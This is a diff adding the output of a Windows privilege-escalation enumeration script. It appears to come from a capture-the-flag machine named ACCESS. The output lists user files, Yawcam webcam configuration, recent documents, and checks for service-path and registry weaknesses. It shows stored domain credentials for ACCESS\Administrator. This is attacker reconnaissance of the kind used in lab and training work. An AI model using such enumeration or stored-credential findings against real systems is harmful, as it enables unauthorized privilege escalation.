+C:\Users\security\.yawcam\www\update.html
+C:\Users\security\Desktop\user.txt
+
+
+-----------------------------------------------------------
+ Folders with Full Control and Modify Access
+-----------------------------------------------------------
+
+Failed to read more folders
+
+Failed to read more folders
+
+Failed to read more folders
+
+-----------------------------------------------------------
+ Mapped Drives
+-----------------------------------------------------------
+
+C:
+D:
+
+
+-----------------------------------------------------------
+ Unquoted Service Paths
+-----------------------------------------------------------
+
+-----------------------------------------------------------
+ Recent Documents
+-----------------------------------------------------------
+
+AutomaticDestinations
+CustomDestinations
+index.html.lnk
+My Videos.lnk
+user.txt.lnk
+www.lnk
+
+
+
+-----------------------------------------------------------
+ Potentially Interesting Files in Users Directory
+-----------------------------------------------------------
+C:\Users\security\.yawcam\2\extravars\README.txt
+C:\Users\security\.yawcam\2\extravars\{temperature}.txt
+C:\Users\security\.yawcam\2\logs\info.txt
+C:\Users\security\.yawcam\2\stream\README.txt
+C:\Users\security\.yawcam\2\tmp\Readme.txt
+C:\Users\security\.yawcam\2\yawcam_settings.xml
+C:\Users\security\.yawcam\extravars\README.txt
+C:\Users\security\.yawcam\extravars\{temperature}.txt
+C:\Users\security\.yawcam\logs\info.txt
+C:\Users\security\.yawcam\stream\README.txt
+C:\Users\security\.yawcam\tmp\Readme.txt
+C:\Users\security\.yawcam\yawcam_settings.xml
+C:\Users\security\Desktop\user.txt
+
+-----------------------------------------------------------
+ 10 Last Modified Files in C:\User
+-----------------------------------------------------------
+C:\Users\security\.yawcam\stream\img
+C:\Users\security\.yawcam\tmp
+C:\Users\security\.yawcam\www
+C:\Users\security\.yawcam\www\index.html
+C:\Users\Administrator
+C:\Users\security\.yawcam\yawcam_settings.xml
+C:\Users\security\.yawcam
+C:\Users\security\Videos
+C:\Users\security\Desktop
+C:\Users\engineer
+
+-----------------------------------------------------------
+ MUICache Files
+-----------------------------------------------------------
+LangID
+C:\Program Files (x86)\Windows Media Player\wmplayer.exe
+C:\Program Files (x86)\Internet Explorer\iexplore.exe
+C:\Program Files\VMware\VMware Tools\VMwareHostOpen.exe
+C:\Windows\system32\mspaint.exe
+C:\Windows\system32\NOTEPAD.EXE
+C:\Program Files\Windows Photo Viewer\PhotoViewer.dll
+C:\Program Files\Windows NT\Accessories\WORDPAD.EXE
+C:\Windows\system32\shell32.dll
+
+-----------------------------------------------------------
+ System Files with Passwords
+-----------------------------------------------------------
+
+-----------------------------------------------------------
+ AlwaysInstalledElevated Registry Key
+-----------------------------------------------------------
+
+-----------------------------------------------------------
+ Stored Credentials
+-----------------------------------------------------------
+
+Currently stored credentials:
+
+    Target: Domain:interactive=ACCESS\Administrator
+    Type: Domain Password
+    User: ACCESS\Administrator
+
+
+-----------------------------------------------------------
+ Checking for AutoAdminLogon
+-----------------------------------------------------------
